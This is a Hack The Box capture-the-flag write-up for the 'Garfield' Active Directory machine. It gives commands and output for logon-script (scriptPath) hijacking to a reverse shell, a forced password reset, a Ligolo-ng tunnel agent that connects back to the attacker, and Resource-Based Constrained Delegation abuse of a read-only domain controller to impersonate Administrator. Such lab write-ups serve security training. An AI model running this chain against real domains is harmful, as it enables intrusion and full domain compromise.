# Garfield — HackTheBox Writeup

**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Garfield)  
**Difficulty:** `Hard`  
**OS:** `Windows`  
**Author:** samurai

> **Starting credentials provided:** `j.arbuckle` / `Th1sD4mnC4t!@1978`

---

## Overview

Garfield is a Hard-rated Windows Active Directory machine. The attack path begins with provided low-privileged domain credentials and progresses through a chain of AD misconfigurations. The initial foothold is gained by abusing write access to a target user's `scriptPath` attribute, causing a malicious logon script to execute on their next authentication. After escalating to an admin-tier account via `ForceChangePassword`, the privilege escalation phase involves pivoting to an isolated subnet, exploiting `SeMachineAccountPrivilege` to add a controlled machine account, and abusing Resource-Based Constrained Delegation (RBCD) against a Read-Only Domain Controller (RODC01) to impersonate Administrator and achieve Domain Admin / Enterprise Admin level access.

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Foothold — scriptPath Abuse](#initial-foothold)
4. [Lateral Movement — ForceChangePassword](#lateral-movement)
5. [Privilege Escalation — RBCD on RODC](#privilege-escalation)

---

## Reconnaissance

Port scanning was performed using RustScan for rapid discovery, followed by a targeted Nmap service scan:

```bash
rustscan -a 10.129.33.43 -- -A -oN nmap.out
```

The port profile is characteristic of a Windows Domain Controller:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: garfield.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    RPC over HTTP 1.0
636/tcp   open  tcpwrapped    (LDAPS)
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  tcpwrapped    (Global Catalog TLS)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          WinRM (Microsoft HTTPAPI 2.0)
9389/tcp  open  adws
```

**Key findings from the scan:**

- Hostname: `DC01.garfield.htb` — this is the domain's primary Domain Controller
- OS: Windows Server 2019 (Build 17763)
- SMB signing is **required** — NTLM relay attacks are not viable
- WinRM (port 5985) is open — accessible with valid credentials via `evil-winrm`
- Hyper-V RDP (port 2179) suggests the DC is running virtual machines

### Open Ports Summary

**Active Directory Core Services**

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | AD-integrated DNS |
| 88/tcp | Kerberos | Authentication service |
| 389/tcp | LDAP | User/group/SPN enumeration |
| 636/tcp | LDAPS | TLS-wrapped LDAP |
| 3268/tcp | Global Catalog | Forest-wide LDAP queries |
| 464/tcp | kpasswd | Kerberos password changes |

**Windows RPC / SMB**

| Port | Service | Notes |
|------|---------|-------|
| 135/tcp | MSRPC | RPC endpoint mapper |
| 139/tcp | NetBIOS-SSN | Legacy SMB session service |
| 445/tcp | SMB | Signing required — relay blocked |
| 593/tcp | RPC over HTTP | Tunnelled RPC |

**Remote Access**

| Port | Service | Notes |
|------|---------|-------|
| 3389/tcp | RDP | Cert CN: `DC01.garfield.htb` |
| 5985/tcp | WinRM | PowerShell remoting |
| 2179/tcp | Hyper-V RDP | Indicates internal VMs |

---

## Enumeration

### SMB Share and User Enumeration

Using the provided credentials, SMB shares and domain users were enumerated via NetExec:

```bash
netexec smb garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares
netexec smb garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --users
```

**Accessible shares:**

```
NETLOGON    READ    Logon server share
SYSVOL      READ    Logon server share
IPC$        READ    Remote IPC
```

**Domain users discovered:**

| Username | Notes |
|----------|-------|
| Administrator | Built-in |
| krbtgt | Standard KDC account |
| krbtgt_8245 | RODC KDC service account — confirms a RODC exists |
| j.arbuckle | Starting account |
| l.wilson | Standard user |
| l.wilson_adm | Admin-tier account for l.wilson |

The presence of `krbtgt_8245` confirms a **Read-Only Domain Controller** in the environment.

### AD Permission Enumeration with BloodyAD

BloodyAD was used to identify write permissions accessible to `j.arbuckle`:

```bash
bloodyAD --host garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable
```

**Key finding:** `j.arbuckle` has `WRITE` permissions over multiple objects, including `l.wilson` and `l.wilson_adm`.

### SYSVOL Logon Script Discovery

Browsing the SYSVOL share revealed a non-default batch script in the `scripts` folder:

```bash
smbclient //10.129.33.43/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
# Path: \garfield.htb\scripts\printerDetect.bat
```

The existence of `printerDetect.bat` in the logon scripts directory, combined with `j.arbuckle`'s write access to `l.wilson`'s AD object, enables a **scriptPath abuse** attack.

---

## Initial Foothold

### scriptPath Attribute Abuse → Reverse Shell as l.wilson

**Attack overview:** In Active Directory, the `scriptPath` attribute on a user object specifies a logon script executed from the SYSVOL `\scripts\` share whenever that user authenticates. Because `j.arbuckle` has write access over `l.wilson`'s AD object and write access to the SYSVOL scripts share, it is possible to:

1. Replace `printerDetect.bat` with a malicious payload
2. Set `l.wilson`'s `scriptPath` to point to it
3. Wait for `l.wilson` to authenticate, triggering execution

**Step 1 — Upload malicious logon script to SYSVOL:**

The legitimate `printerDetect.bat` was replaced with a PowerShell reverse shell payload and uploaded:

```bash
smbclient //10.129.33.43/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
smb: \garfield.htb\scripts\> put printerDetect.bat
```

**Step 2 — Set l.wilson's scriptPath attribute:**

```bash
bloodyAD --host 10.129.33.43 -d garfield.htb \
  -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath \
  -v printerDetect.bat
# [+] CN=Liz Wilson,...'s scriptPath has been updated.
```

**Step 3 — Catch the reverse shell:**

```bash
rlwrap nc -lnvp 9001
```

When `l.wilson` authenticated, the logon script executed and a shell was received:

```
connect to [10.10.14.149] from (UNKNOWN) [10.129.33.43] 53964
whoami
garfield\l.wilson
PS C:\Windows\system32>
```

---

## Lateral Movement

### ForceChangePassword — l.wilson → l.wilson_adm

Further enumeration (confirmed via BloodHound) revealed that `l.wilson` has `ForceChangePassword` rights over `l.wilson_adm`. This ACE allows forcibly resetting the account's password without knowing the current one.

**Password reset via ADSI from the shell:**

```powershell
$user = [ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
$user.SetPassword("Garfield_HTB_Admin_2026!@#")
$user.CommitChanges()
```

**Validation:**

```bash
crackmapexec smb 10.129.33.43 -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#'
# [+] garfield.htb\l.wilson_adm:Garfield_HTB_Admin_2026!@#
```

**WinRM access and user flag:**

```bash
evil-winrm -i garfield.htb -u l.wilson_adm -p 'Garfield_HTB_Admin_2026!@#'
```

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> type ..\Desktop\user.txt
00ad28a3ee5abba46512d287fdc95d3f
```

**User flag captured.**

---

## Privilege Escalation

### Overview

Further enumeration identified an isolated internal subnet (`192.168.100.0/24`) hosting a Read-Only Domain Controller (`RODC01`) at `192.168.100.2`. The `l.wilson_adm` account holds `SeMachineAccountPrivilege`, enabling creation of machine accounts. Combined with ACE rights allowing membership in the `RODC Administrators` group, this enables a full **Resource-Based Constrained Delegation (RBCD)** attack chain against RODC01 — which runs as Administrator with Domain Admin and Enterprise Admin group membership.

### Step 1 — Network Pivot with Ligolo-ng

Since RODC01 is only reachable from DC01's internal interface, a tunnel was established using **Ligolo-ng**:

**Upload and execute the agent on DC01:**

```bash
# Upload agent via Evil-WinRM
*Evil-WinRM* PS C:\Temp> upload agent.exe
*Evil-WinRM* PS C:\Temp> .\agent.exe -connect 10.10.14.149:11601 -ignore-cert
# time="..." level=info msg="Connection established"
```

**Configure the tunnel on the attacker machine:**

```bash
./proxy -selfcert
ligolo-ng » session
# Select: GARFIELD\l.wilson_adm@DC01
[Agent : GARFIELD\l.wilson_adm@DC01] » start
# INFO: Starting tunnel to GARFIELD\l.wilson_adm@DC01
```

The `192.168.100.0/24` subnet is now routable from the attacker machine.

### Step 2 — Add l.wilson_adm to RODC Administrators

`l.wilson_adm` has the necessary ACEs to add itself to the `RODC Administrators` group:

```bash
bloodyAD --host garfield.htb -u l.wilson_adm -p 'Garfield_HTB_Admin_2026!@#' \
  add groupMember "RODC Administrators" l.wilson_adm
# [+] l.wilson_adm added to RODC Administrators
```

Membership in `RODC Administrators` grants the rights to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on `RODC01$`, which is the prerequisite for RBCD.

### Step 3 — Create a Controlled Machine Account

`SeMachineAccountPrivilege` allows domain-joined users to add machine accounts. A controlled computer account was created for use as the RBCD delegation source:

```bash
impacket-addcomputer \
  -computer-name 'samurai' \
  -computer-pass 'Password123!' \
  -dc-ip 10.129.33.43 \
  garfield.htb/l.wilson_adm:'Garfield_HTB_Admin_2026!@#'
# [*] Successfully added machine account samurai$ with password Password123!
```

### Step 4 — Configure RBCD on RODC01$

The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on `RODC01$` was set to allow the controlled `samurai$` machine account to delegate on its behalf:

```bash
impacket-rbcd \
  -action write \
  -delegate-from 'samurai$' \
  -delegate-to 'RODC01$' \
  -dc-ip 10.129.33.43 \
  garfield.htb/l.wilson_adm:'Garfield_HTB_Admin_2026!@#'
```

### Step 5 — Request a Service Ticket as Administrator (S4U2self + S4U2proxy)

With RBCD configured, `impacket-getST` was used to perform the full S4U Kerberos extension chain — S4U2self to obtain a ticket on behalf of Administrator, then S4U2proxy to request a service ticket for `RODC01`:

```bash
impacket-getST \
  -spn 'cifs/RODC01.garfield.htb' \
  -impersonate Administrator \
  -altservice host \
  -dc-ip 10.129.33.43 \
  garfield.htb/'samurai$':'Password123!'
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from cifs/RODC01.garfield.htb to host/RODC01.garfield.htb
[*] Saving ticket in Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

### Step 6 — Authenticate to RODC01 as Administrator

The obtained Kerberos ticket was used for pass-the-ticket authentication via WMIExec:

```bash
export KRB5CCNAME=Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache

impacket-wmiexec \
  -k -no-pass \
  -dc-ip 10.129.33.43 \
  garfield.htb/Administrator@RODC01.garfield.htb
```

```
[*] SMBv3.0 dialect used
C:\>whoami /groups
```

Group membership confirmed Administrator on RODC01 is a member of **Domain Admins**, **Enterprise Admins**, and **Schema Admins** — granting full forest-level control.

**Root flag captured.**

---

## Attack Chain Summary

```
Provided credentials: j.arbuckle / Th1sD4mnC4t!@1978
    └─► WRITE ACE on l.wilson AD object + SYSVOL write access
            └─► scriptPath abuse → Malicious logon script execution
                    └─► Reverse shell as l.wilson
                            └─► ForceChangePassword ACE on l.wilson_adm
                                    └─► Password reset → Shell as l.wilson_adm
                                            └─► user.txt
                                                    └─► SeMachineAccountPrivilege
                                                    └─► RODC Administrators group membership
                                                            └─► RBCD configured on RODC01$
                                                                    └─► S4U2self + S4U2proxy → Administrator ST
                                                                            └─► Domain Admin / Enterprise Admin
                                                                                    └─► root.txt
```

---

## Techniques & Tools Referenced

| Technique / Tool | Purpose |
|------------------|---------|
| BloodyAD | AD ACE enumeration and attribute manipulation |
| NetExec / CrackMapExec | SMB share/user enumeration and credential validation |
| scriptPath abuse | Logon script hijacking via writable SYSVOL + user object |
| ForceChangePassword | ACE-based password reset without knowing current password |
| Ligolo-ng | Network tunnelling / pivoting to internal subnet |
| impacket-addcomputer | Machine account creation via `SeMachineAccountPrivilege` |
| impacket-rbcd | RBCD attribute configuration |
| impacket-getST | S4U2self + S4U2proxy Kerberos ticket request |
| impacket-wmiexec | Pass-the-ticket WMI shell |
| Evil-WinRM | PowerShell remoting with valid credentials |

---

## Key Takeaways

- `SeMachineAccountPrivilege` is frequently overlooked but is a powerful stepping stone when combined with ACEs that allow delegation configuration on high-value targets.
- RODC environments introduce unique attack surfaces — the RODC's local Administrator account often holds elevated AD group memberships (Domain Admins, Enterprise Admins) that can be abused once the machine is compromised.
- BloodHound / BloodyAD are essential for mapping ACE chains that would otherwise be invisible through standard enumeration.
- RBCD attacks do not require Domain Admin privileges to configure — only write access to the target computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

